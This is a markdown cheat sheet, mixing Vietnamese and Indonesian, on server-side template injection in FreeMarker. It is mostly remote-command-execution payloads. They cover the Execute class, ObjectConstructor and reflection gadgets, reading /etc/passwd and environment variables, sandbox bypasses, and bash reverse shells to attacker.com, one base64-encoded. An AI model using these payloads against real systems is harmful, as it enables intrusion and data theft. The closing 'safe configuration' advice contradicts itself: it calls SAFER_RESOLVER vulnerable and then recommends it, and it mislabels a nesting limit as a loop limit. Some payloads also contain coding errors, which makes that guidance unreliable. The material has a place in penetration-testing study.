# 15 - FreeMarker (Java)

## Tổng Quan

**FreeMarker** là template engine phổ biến cho Java, được sử dụng trong:

- Spring Framework applications
- Apache projects
- Các ứng dụng Java enterprise

## Cú Pháp Cơ Bản

```freemarker
<#-- Comment -->
${variable}             <#-- Output variable -->
${user.name}            <#-- Access property -->
${items[0]}             <#-- Array access -->
${value?upper_case}     <#-- Built-in function -->
<#if condition>...</#if>
<#list items as item>...</#list>
<#assign var = value>
```

## Built-in Functions và Globals

```freemarker
${.version}             <#-- FreeMarker version -->
${.now}                 <#-- Current date/time -->
${.data_model}          <#-- Data model -->
<#assign x="test">
${x}
```

## SSTI Detection

### Basic Math Test

```freemarker
${7*7}                  → 49
${7*'7'}                → 7777777 (string repeat)
${'hello'?length}       → 5
```

### Configuration Access

```freemarker
${"".getClass().forName("java.lang.Runtime")}
```

## RCE via Java Reflection

FreeMarker dapat akses Java classes melalui reflection:

### Method 1: Direct Runtime.exec()

```freemarker
<#assign value="freemarker.template.utility.Execute"?new()>
${value("whoami")}
```

**Explanation:**

- `freemarker.template.utility.Execute` adalah class yang allow command execution
- `?new()` membuat instance baru
- Memanggil dengan command string

### Method 2: Via ObjectConstructor

```freemarker
<#assign value="{\"freemarker.template.utility.ObjectConstructor\":null}">
<#assign classname="java.lang.ProcessBuilder">
<#assign x=value["freemarker.template.utility.ObjectConstructor"]("java.lang.ProcessBuilder",["cmd","/c","whoami"])>
${x.start()}
```

### Method 3: Via Class.forName

```freemarker
<#assign classloader=object.getClass().getProtectionDomain().getClassLoader()>
<#assign clazz=classloader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime",null)>
<#assign instance=method.invoke(null,null)>
<#assign method=clazz.getMethod("exec",classLoader.loadClass("[Ljava/lang/String;"))>
${method.invoke(instance,["/bin/sh","-c","whoami"])}
```

## Unsafe FreeMarker Configuration

Jika FreeMarker dikonfigurasi dengan `new_builtin_class_resolver`:

```java
// UNSAFE Configuration
Configuration config = new Configuration();
config.setNewBuiltinClassResolver(Configuration.SAFER_RESOLVER); // Vulnerable
```

Memungkinkan instantiation class arbitrary.

## Payloads - Common Gadgets

### Using Execute Class (Most Common)

```freemarker
<#assign value="freemarker.template.utility.Execute"?new()>
${value("id")}

${"freemarker.template.utility.Execute"?new()("id")}
```

### Multi-line Version (Cleaner)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
<#list ex("whoami") as x>
${x}
</#list>
```

### Directly in Output

```freemarker
${("freemarker.template.utility.Execute")?new()("id")}
```

## Data Exfiltration

### File Reading

```freemarker
<#assign value="freemarker.template.utility.Execute"?new()>
${value("cat /etc/passwd")}

<#assign value="freemarker.template.utility.Execute"?new()>
${value("type C:\\Windows\\win.ini")}  <#-- Windows -->
```

### Environment Variables

```freemarker
${.globals}  <#-- FreeMarker globals -->

<#-- Via Java System properties -->
${("freemarker.template.utility.Execute")?new()("env")}  <#-- Linux -->
${("freemarker.template.utility.Execute")?new()("set")}  <#-- Windows -->
```

## Reverse Shell

### Bash

```freemarker
${("freemarker.template.utility.Execute")?new()("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash")}
```

### Via nc/bash

```freemarker
<#assign value="freemarker.template.utility.Execute"?new()>
${value("/bin/sh|-c|bash -i >& /dev/tcp/attacker.com/4444 0>&1")}
```

## Sandbox Bypass

### If ObjectConstructor Allowed

```freemarker
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=oc("java.lang.ProcessBuilder",["bash","-c","id"])>
${pb.start()}
```

### If Class Loading Disabled

Gunakan alternatif:

```freemarker
<#-- Jika reflection/class loading diblokir, sulit untuk bypass -->
<#-- Tapi bisa exploit built-in functions -->
${.version}  <#-- Information disclosure -->
```

## Detection Payloads

```freemarker
# Basic math
${7*7}                  → 49

# Version info
${.version}             → FreeMarker version

# Error trigger
<#assign x="test">
${x}                    → If works, FreeMarker likely

# Class access test
${object.class}         → Akses class object
```

## FreeMarker Security Configuration

```java
// SAFE Configuration
Configuration config = new Configuration();

// Restrict object wrapper
config.setObjectWrapper(
    new DefaultObjectWrapperBuilder(Configuration.VERSION_2_3_31)
        .setForceLegacyObjectWrapper(false)
        .build()
);

// Disable unsafe features
config.setNewBuiltinClassResolver(
    Configuration.SAFER_RESOLVER  // More restrictive
);

// Set max loop iterations
config.setMaxTemplateNestingLevel(100);

// Use FreeMarkerClassResolver.SAFER_RESOLVER atau SAFER
config.setNewBuiltinClassResolver(Configuration.SAFER_RESOLVER);

// Never pass user input as template source
String userTemplate = getUserInput();
// ❌ UNSAFE
// Template template = config.getTemplate(userTemplate);
// ✓ SAFE
Template template = config.getTemplate("safe-template-name");
template.process(safeDataModel, writer);
```

## Version-Specific Quirks

### FreeMarker < 2.3.24

Lebih mudah di-exploit karena keamanan kurang

### FreeMarker >= 2.3.24

- Introduced `SAFER_RESOLVER`
- Restricted ObjectConstructor access
- Lebih aman tapi masih vulnerable jika misconfigured

## Tài Liệu Liên Quan

- [04-exploitation-techniques.md](04-exploitation-techniques.md) - Kỹ thuật khai thác
- [15-sandbox-bypass.md](15-sandbox-bypass.md) - Bypass sandbox
